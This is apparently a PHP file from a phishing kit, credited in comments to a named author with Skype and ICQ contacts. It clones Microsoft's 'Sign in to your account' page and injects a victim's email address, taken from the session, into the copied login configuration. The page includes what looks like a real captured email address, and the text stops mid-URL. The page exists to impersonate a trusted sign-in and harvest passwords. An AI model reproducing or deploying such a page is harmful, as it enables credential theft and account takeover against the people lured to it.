<?php
// THIS SCRIPT CODED BY saradauchia2
// CONTACT US SKYPE : saradauchia2
// ICQ : 706318279

session_start();
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
$email = $_SESSION['loginfmt'];
$_SESSION['loginfmt'] = $email;

?>
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">


    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
    
<meta name="robots" content="none">

<script type="text/javascript">//<![CDATA[
$Config={"fShowPersistentCookiesWarning":false,"urlMsaSignUp":"https://login.live.com/oauth20_authorize.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYWSvW_bVhTFRclWbKdJ3DYtMhUeMgQJKL_Hx0eJKgqUFklbtPgUWWT0sQgURVH8EEmRlKjoDyg6FQEKFK0DZCjQJVPQqe3UrYGnrPHooXEzFR2KAlliZw5Q4OAC59w7XOD8tq5wpUoJlMDdAizB6m0WsdgoD3maNzhEszwEtMEyHI0w4hAD4AgDFH-0tf1m3nnyMTiQHj9R7v35V1A9pjYHvrOwSmY4fUp9NknTKKnu7mZZVgrHY8d8t9j1jWDkBPYvFPWCos4p6ji_bgW03n6aTzhUxhUWAAw5nsM85NmSKsouce2HpCOlRFSm_TYATe3Ib2gTV532UnV65PXd1pIwOkOmOu6LetbTTJa4rZRoElRrl_c2aHRkR92vp31NxX3NZvqa7Klub3mav9EU5umEuRxh7Kysf_Kb4zCeDqIwSY8L3-W7aTTWWWPlmg_CWW3UbOKW1R_4fmVpo9p8VtblhcrN9v1ex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wH855LnK7stgg-6C4XYWYSn5uI7P1xOgv3LMjNGnIi7UXN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQ-4qieBou-8t6c4UkCTFebUUWoj7kkGkrAvcwER1iiAjxsq62YgF1NWeh4JqJFy3ngeHRozqZpiShy_Gql2qx7xK4h4dg6Zt1ogwiydCgDiQtJdEBaP1cKF6UOQ2Dk8L1MLICZ7QTxeHY8a2zwrZnBV96ydCI4zC47PzFGvV67dON4vbGrdxO7s5NUKhubGxt5y7df2vUj-sXMJ3_UHluXC9I3_v_fvLy1xu5k_VdvdMoJ4KbwkqbEfBKGzL1TCUHxr2yiOyjzAgIszyMDg9T3v6CqcJHRepRsXhS_LAuDoiktTWBiMKRyAzA38X811dyv23-D5KnWzcZwEAacDRgdyCoYnSh_unVi_c-P-OdfP2bvW9_uuW9-uoP4ex94bMPqN-v5d4C0\u0026username=ken%40ksbarron.com\u0026estsfed=1\u0026uaid=9e5775fb301345489b9e4a2be6e96e3a\u0026signup=1\u0026lw=1\u0026fl=easi2\u0026fci=4345a7b9-9a63-4910-a426-35363201d503\u0026mkt=en-US","urlMsaLogout":"https://login.live.com/logout.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","urlOtherIdpForget":"https://login.live.com/forgetme.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","showCantAccessAccountLink":true,"urlGitHubFed":"https://login.live.com/oauth20_authorize.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYWSvW_bVhTFRclWbKdJ3DYtMhUeMgQJKL_Hx0eJKgqUFklbtPgUWWT0sQgURVH8EEmRlKjoDyg6FQEKFK0DZCjQJVPQqe3UrYGnrPHooXEzFR2KAlliZw5Q4OAC59w7XOD8tq5wpUoJlMDdAizB6m0WsdgoD3maNzhEszwEtMEyHI0w4hAD4AgDFH-0tf1m3nnyMTiQHj9R7v35V1A9pjYHvrOwSmY4fUp9NknTKKnu7mZZVgrHY8d8t9j1jWDkBPYvFPWCos4p6ji_bgW03n6aTzhUxhUWAAw5nsM85NmSKsouce2HpCOlRFSm_TYATe3Ib2gTV532UnV65PXd1pIwOkOmOu6LetbTTJa4rZRoElRrl_c2aHRkR92vp31NxX3NZvqa7Klub3mav9EU5umEuRxh7Kysf_Kb4zCeDqIwSY8L3-W7aTTWWWPlmg_CWW3UbOKW1R_4fmVpo9p8VtblhcrN9v1ex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wH855LnK7stgg-6C4XYWYSn5uI7P1xOgv3LMjNGnIi7UXN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQ-4qieBou-8t6c4UkCTFebUUWoj7kkGkrAvcwER1iiAjxsq62YgF1NWeh4JqJFy3ngeHRozqZpiShy_Gql2qx7xK4h4dg6Zt1ogwiydCgDiQtJdEBaP1cKF6UOQ2Dk8L1MLICZ7QTxeHY8a2zwrZnBV96ydCI4zC47PzFGvV67dON4vbGrdxO7s5NUKhubGxt5y7df2vUj-sXMJ3_UHluXC9I3_v_fvLy1xu5k_VdvdMoJ4KbwkqbEfBKGzL1TCUHxr2yiOyjzAgIszyMDg9T3v6CqcJHRepRsXhS_LAuDoiktTWBiMKRyAzA38X811dyv23-D5KnWzcZwEAacDRgdyCoYnSh_unVi_c-P-OdfP2bvW9_uuW9-uoP4ex94bMPqN-v5d4C0\u0026username=ken%40ksbarron.com\u0026estsfed=1\u0026uaid=9e5775fb301345489b9e4a2be6e96e3a\u0026fci=4345a7b9-9a63-4910-a426-35363201d503\u0026mkt=en-US\u0026idp_hint=github.com","fShowSignInWithGitHubOnlyOnCredPicker":true,"fEnableShowResendCode":true,"iShowResendCodeDelay":90000,"sSMSCtryPhoneData":"AF~Afghanistan~93!!!AX~�land Islands~358!!!AL~Albania~355!!!DZ~Algeria~213!!!AS~American Samoa~1!!!AD~Andorra~376!!!AO~Angola~244!!!AI~Anguilla~1!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~246!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~C�te d\u0027Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Cura�ao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!NF~Norfolk Island~672!!!KP~North Korea~850!!!MK~North Macedonia~389!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!PR~Puerto Rico~1!!!QA~Qatar~974!!!RE~R�union~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!BL~Saint Barth�lemy~590!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!MF~Saint Martin~590!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~S�o Tom� and Pr�ncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!SX~Sint Maarten~1!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension, and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!VI~U.S. Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!GB~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican City~39!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263","fUseInlinePhoneNumber":true,"fDetectBrowserCapabilities":true,"urlSessionState":"https://login.microsoftonline.com/common/DeviceCodeStatus","urlResetPassword":"https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81\u0026mkt=en-US\u0026hosted=0\u0026device_platform=Windows+10","urlMsaResetPassword":"https://account.live.com/password/reset?wreply=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYVSv4_TZgCNk7twHAKuLVRM1Q0MqMi57_Pnz4mDKtUX23fxxV_IxSY_lshxHMc_Yju2E4f8AVUnhISE-CExILEwMhUmNqqbWHvjDUA7VQwVEkvv9kqVnp70nt7wpPc2z3GlSgmUwI8FWILV6yxisVEe8jRvcIhmeQhog2U4GmHEIQbAEQYo_nZz6-u88-w7sC89fabc_PBnUH1J_TBJ0yip7uxkWVYKx2PHtEpmON3xjWDkBPZvFPWeoj5R1JP8uhXQevtlPuFQGVdYADDkeA7zkGdLqii7xLXvko6UElGZ9tsANLVDv6FNXHXaS9Xpodd3W0vC6AyZ6rgv6llPM1nitlKiSVCtneVt0OjIjrpXT_uaivuazfQ12VPd3vI4f7kpzNMJc0Zh7Kysz_nz4zCeDqIwSZ8UHua7aTTWWWPlmnfCWW3UbOKW1R_4fmVpo9p8VtblhcrN9vxex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wG855LnK7stgje7y4XYWYSn5uI7O1xOgt3LcjNGnIi7UbN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQe4qieBou-8t6c4UkCTFebUUWoj7kkGkrAnc3ER1iiAjxsq62YgF1NWeh4JqJFy3njuHRozqZpiShy_Gql2qx7xK4i4dg6Zt1ogwiydCgDiQtJdE-aL0qFE_HnIbBUeFSGFmBM9qO4nDs-NZJYcuzgp-9ZGjEcRicbf5-jfpr7fuN4tbGtdx27sYVUKhubGxu5c7UlzXq-frpgT49rvxuXCpIj_x_rv7x-nLuaH1H7zTKieCmsNJmBLzShkw9U8m-cbMsIvswMwLCLA-ig4OUt39iqvB-kbpfLB4Vv6mLAyJpbU0gonAoMgPwdzH_67ncm_P_c8njzSsMYCANOBqw2xBUMTpF__jCab1bJ7yTr9_bffDimvfxl3fCyX-Zby_m_gU1\u0026mkt=en-US","urlSignUp":"https://login.live.com/oauth20_authorize.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYWSvW_bVhTFRclWbKdJ3DYtMhUeMgQJKL_Hx0eJKgqUFklbtPgUWWT0sQgURVH8EEmRlKjoDyg6FQEKFK0DZCjQJVPQqe3UrYGnrPHooXEzFR2KAlliZw5Q4OAC59w7XOD8tq5wpUoJlMDdAizB6m0WsdgoD3maNzhEszwEtMEyHI0w4hAD4AgDFH-0tf1m3nnyMTiQHj9R7v35V1A9pjYHvrOwSmY4fUp9NknTKKnu7mZZVgrHY8d8t9j1jWDkBPYvFPWCos4p6ji_bgW03n6aTzhUxhUWAAw5nsM85NmSKsouce2HpCOlRFSm_TYATe3Ib2gTV532UnV65PXd1pIwOkOmOu6LetbTTJa4rZRoElRrl_c2aHRkR92vp31NxX3NZvqa7Klub3mav9EU5umEuRxh7Kysf_Kb4zCeDqIwSY8L3-W7aTTWWWPlmg_CWW3UbOKW1R_4fmVpo9p8VtblhcrN9v1ex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wH855LnK7stgg-6C4XYWYSn5uI7P1xOgv3LMjNGnIi7UXN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQ-4qieBou-8t6c4UkCTFebUUWoj7kkGkrAvcwER1iiAjxsq62YgF1NWeh4JqJFy3ngeHRozqZpiShy_Gql2qx7xK4h4dg6Zt1ogwiydCgDiQtJdEBaP1cKF6UOQ2Dk8L1MLICZ7QTxeHY8a2zwrZnBV96ydCI4zC47PzFGvV67dON4vbGrdxO7s5NUKhubGxt5y7df2vUj-sXMJ3_UHluXC9I3_v_fvLy1xu5k_VdvdMoJ4KbwkqbEfBKGzL1TCUHxr2yiOyjzAgIszyMDg9T3v6CqcJHRepRsXhS_LAuDoiktTWBiMKRyAzA38X811dyv23-D5KnWzcZwEAacDRgdyCoYnSh_unVi_c-P-OdfP2bvW9_uuW9-uoP4ex94bMPqN-v5d4C0\u0026username=ken%40ksbarron.com\u0026estsfed=1\u0026uaid=9e5775fb301345489b9e4a2be6e96e3a\u0026signup=1\u0026lw=1\u0026fl=easi2\u0026fci=4345a7b9-9a63-4910-a426-35363201d503\u0026mkt=en-US","urlGetCredentialType":"https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US","urlGetOneTimeCode":"https://login.microsoftonline.com/common/GetOneTimeCode","urlLogout":"https://login.microsoftonline.com/common/uxlogout","urlForget":"https://login.microsoftonline.com/forgetuser","urlDisambigRename":"https://go.microsoft.com/fwlink/p/?LinkID=733247","urlGoToAADError":"https://login.live.com/oauth20_authorize.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYWSvW_bVhTFRclWbKdJ3DYtMhUeMgQJKL_Hx0eJKgqUFklbtPgUWWT0sQgURVH8EEmRlKjoDyg6FQEKFK0DZCjQJVPQqe3UrYGnrPHooXEzFR2KAlliZw5Q4OAC59w7XOD8tq5wpUoJlMDdAizB6m0WsdgoD3maNzhEszwEtMEyHI0w4hAD4AgDFH-0tf1m3nnyMTiQHj9R7v35V1A9pjYHvrOwSmY4fUp9NknTKKnu7mZZVgrHY8d8t9j1jWDkBPYvFPWCos4p6ji_bgW03n6aTzhUxhUWAAw5nsM85NmSKsouce2HpCOlRFSm_TYATe3Ib2gTV532UnV65PXd1pIwOkOmOu6LetbTTJa4rZRoElRrl_c2aHRkR92vp31NxX3NZvqa7Klub3mav9EU5umEuRxh7Kysf_Kb4zCeDqIwSY8L3-W7aTTWWWPlmg_CWW3UbOKW1R_4fmVpo9p8VtblhcrN9v1ex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wH855LnK7stgg-6C4XYWYSn5uI7P1xOgv3LMjNGnIi7UXN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQ-4qieBou-8t6c4UkCTFebUUWoj7kkGkrAvcwER1iiAjxsq62YgF1NWeh4JqJFy3ngeHRozqZpiShy_Gql2qx7xK4h4dg6Zt1ogwiydCgDiQtJdEBaP1cKF6UOQ2Dk8L1MLICZ7QTxeHY8a2zwrZnBV96ydCI4zC47PzFGvV67dON4vbGrdxO7s5NUKhubGxt5y7df2vUj-sXMJ3_UHluXC9I3_v_fvLy1xu5k_VdvdMoJ4KbwkqbEfBKGzL1TCUHxr2yiOyjzAgIszyMDg9T3v6CqcJHRepRsXhS_LAuDoiktTWBiMKRyAzA38X811dyv23-D5KnWzcZwEAacDRgdyCoYnSh_unVi_c-P-OdfP2bvW9_uuW9-uoP4ex94bMPqN-v5d4C0\u0026username=ken%40ksbarron.com\u0026estsfed=1\u0026uaid=9e5775fb301345489b9e4a2be6e96e3a\u0026fci=4345a7b9-9a63-4910-a426-35363201d503\u0026mkt=en-US","urlCBPartnerPreload":"https://www.office.com/prefetch/prefetch","urlPIAEndAuth":"https://login.microsoftonline.com/common/PIA/EndAuth","fCBShowSignUp":true,"fKMSIEnabled":false,"iLoginMode":1,"fAllowPhoneSignIn":true,"fAllowPhoneInput":true,"fAllowSkypeNameLogin":true,"iMaxPollErrors":5,"iPollingTimeout":60,"srsSuccess":true,"fShowSwitchUser":true,"arrValErrs":["50126"],"sErrorCode":"50126","sErrTxt":"","sResetPasswordPrefillParam":"username","sPOST_PaginatedLoginState":2,"sPOST_PaginatedLoginStateRNGCSLK":"","sPOST_Type":11,"onPremPasswordValidationConfig":{"isUserRealmPrecheckEnabled":true},"fSwitchDisambig":true,"oCancelPostParams":{"error":"access_denied","error_subcode":"cancel","state":"XtpfU4azjcVoqCdOO5QeZ_ll8xg3Cuq7UFvM6qGlYWeFa3w2E3S0rS6-s8uu1bYjWl8J56fUd4zpM3jMkNP0uYjNiXFjQN5HXxvowcNl6hD4PftqoBe16qLFsEBpOzq13lhOFnUicDL5Ffoh_dFL8wEc4vhhs1bTgL2XDA-GJJJkT57lxIOz3EE32kCzNvDUb63cgJA6ysDiNaD339FUMQrA3XTivJ5Cc5vQiVak-dINmtNs-7rzYtTrljN1B5b0xlcINJ_pEaT1U0ETtNpH0Q"},"iRemoteNgcPollingType":2,"oGetCredTypeResult":{"Username":"<?php echo $email ?>","Display":"<?php echo $email ?>","IfExistsResult":0,"IsUnmanaged":false,"ThrottleStatus":0,"Credentials":{"PrefCredential":1,"HasPassword":true},"EstsProperties":{"UserTenantBranding":null,"DomainType":3},"FlowToken":"AQABAAEAAAD--DLA3VO7QrddgJg7WevrvzGTBai7rWYm2h_WPz31cMCfB1Z-tiWwZVuBfnz7ZLbkQS3Rt9neprd9mJAVvXttTlhtd6QyC2rc3iIxnltNaeqPrKPF0il_S4xjxamVXVGH6Yt8eoLV4GdPn_PwOur1c1vpNxj7nKnoHx58P_rqHzrRAPkmVY7fBPvXVv3fQRagnnebktfYxp2_GlUCvisCTLPX59xoB4fGIp8Ao7YKjCduLxn6r57rJa_qU4clXnW0XW-ZWQP65ZohoQuwFXqlzpFxAaGQO2-acesTJROmS1S7_UDvWVz91tLffDX_l8EUeAX8Qi3lEBpqVYbZjO32353FGQh3y70AcdIkY3KND4h4XQ9MDd_mTYqqmzn7R8MFdLBEeKhRqCCKeuTt_RorWg1vMBOeixVjIZT3yur3p_qlR7sSDW3CIJ574IZthebclH6JDiS56jjJtcM1c-Bt87G0X_uLNsif0B5zjR0DxwfI0_mnpyBfZk3_D0uNQkL6XAl01THIrH01Ij4_c0QzP_IbXlBvrIbC4lwjsejpjm9BCfBlnEC0HFZtZhtqd3qd7OFI3KYTyH-pf2rrN0OuIAA","IsSignupDisallowed":true},"fUseNewNoPasswordTypes":true,"fAccessPassSupported":true,"fShowAccessPassPeek":true,"urlAadSignup":"https://signup.microsoft.com/signup?sku=teams_commercial_trial\u0026origin=ests\u0026culture=en-US","urlOidcDiscoveryEndpointFormat":"https://login.microsoftonline.com/{0}/.well-known/openid-configuration","urlTenantedEndpointFormat":"https://login.microsoftonline.com/{0}/oauth2/authorize?allowbacktocommon=True","sCloudInstanceName":"microsoftonline.com","fShowSignInOptionsAsButton":true,"fImprovePhoneDisambig":true,"iMaxStackForKnockoutAsyncComponents":10000,"fShowButtons":true,"fEnabledFlaggedSigninFlow":true,"urlCdn":"https://aadcdn.msftauth.net/shared/1.0/","urlFooterTOU":"https://www.microsoft.com/en-US/servicesagreement/","urlFooterPrivacy":"https://privacy.microsoft.com/en-US/privacystatement","urlPost":"https://login.microsoftonline.com/common/login","urlPostAad":"https://login.microsoftonline.com/common/login","urlPostMsa":"https://login.live.com/ppsecure/partnerpost.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYWSvW_bVhTFRclWbKdJ3DYtMhUeMgQJKL_Hx0eJKgqUFklbtPgUWWT0sQgURVH8EEmRlKjoDyg6FQEKFK0DZCjQJVPQqe3UrYGnrPHooXEzFR2KAlliZw5Q4OAC59w7XOD8tq5wpUoJlMDdAizB6m0WsdgoD3maNzhEszwEtMEyHI0w4hAD4AgDFH-0tf1m3nnyMTiQHj9R7v35V1A9pjYHvrOwSmY4fUp9NknTKKnu7mZZVgrHY8d8t9j1jWDkBPYvFPWCos4p6ji_bgW03n6aTzhUxhUWAAw5nsM85NmSKsouce2HpCOlRFSm_TYATe3Ib2gTV532UnV65PXd1pIwOkOmOu6LetbTTJa4rZRoElRrl_c2aHRkR92vp31NxX3NZvqa7Klub3mav9EU5umEuRxh7Kysf_Kb4zCeDqIwSY8L3-W7aTTWWWPlmg_CWW3UbOKW1R_4fmVpo9p8VtblhcrN9v1ex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wH855LnK7stgg-6C4XYWYSn5uI7P1xOgv3LMjNGnIi7UXN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQ-4qieBou-8t6c4UkCTFebUUWoj7kkGkrAvcwER1iiAjxsq62YgF1NWeh4JqJFy3ngeHRozqZpiShy_Gql2qx7xK4h4dg6Zt1ogwiydCgDiQtJdEBaP1cKF6UOQ2Dk8L1MLICZ7QTxeHY8a2zwrZnBV96ydCI4zC47PzFGvV67dON4vbGrdxO7s5NUKhubGxt5y7df2vUj-sXMJ3_UHluXC9I3_v_fvLy1xu5k_VdvdMoJ4KbwkqbEfBKGzL1TCUHxr2yiOyjzAgIszyMDg9T3v6CqcJHRepRsXhS_LAuDoiktTWBiMKRyAzA38X811dyv23-D5KnWzcZwEAacDRgdyCoYnSh_unVi_c-P-OdfP2bvW9_uuW9-uoP4ex94bMPqN-v5d4C0\u0026username=ken%40ksbarron.com\u0026flow=fido\u0026estsfed=1\u0026uaid=9e5775fb301345489b9e4a2be6e96e3a\u0026fci=4345a7b9-9a63-4910-a426-35363201d503\u0026mkt=en-US","urlRefresh":"https://login.microsoftonline.com/common/reprocess?ctx=rQIIAYVSv4_TZgCNk7twHAKuLVRM1Q0MqMi57_Pnz4mDKtUX23fxxV_IxSY_lshxHMc_Yju2E4f8AVUnhISE-CExILEwMhUmNqqbWHvjDUA7VQwVEkvv9kqVnp70nt7wpPc2z3GlSgmUwI8FWILV6yxisVEe8jRvcIhmeQhog2U4GmHEIQbAEQYo_nZz6-u88-w7sC89fabc_PBnUH1J_TBJ0yip7uxkWVYKx2PHtEpmON3xjWDkBPZvFPWeoj5R1JP8uhXQevtlPuFQGVdYADDkeA7zkGdLqii7xLXvko6UElGZ9tsANLVDv6FNXHXaS9Xpodd3W0vC6AyZ6rgv6llPM1nitlKiSVCtneVt0OjIjrpXT_uaivuazfQ12VPd3vI4f7kpzNMJc0Zh7Kysz_nz4zCeDqIwSZ8UHua7aTTWWWPlmnfCWW3UbOKW1R_4fmVpo9p8VtblhcrN9vxex5INlDESaoO4zdFJZT6Hw57b8SsK5sb6iF1FKnJVj9wG855LnK7stgje7y4XYWYSn5uI7O1xOgt3LcjNGnIi7UbN1Qwif9KUA90xxQaWx-FkMJIblUwy2cVkksChZjeYrijQe4qieBou-8t6c4UkCTFebUUWoj7kkGkrAnc3ER1iiAjxsq62YgF1NWeh4JqJFy3njuHRozqZpiShy_Gql2qx7xK4i4dg6Zt1ogwiydCgDiQtJdE-aL0qFE_HnIbBUeFSGFmBM9qO4n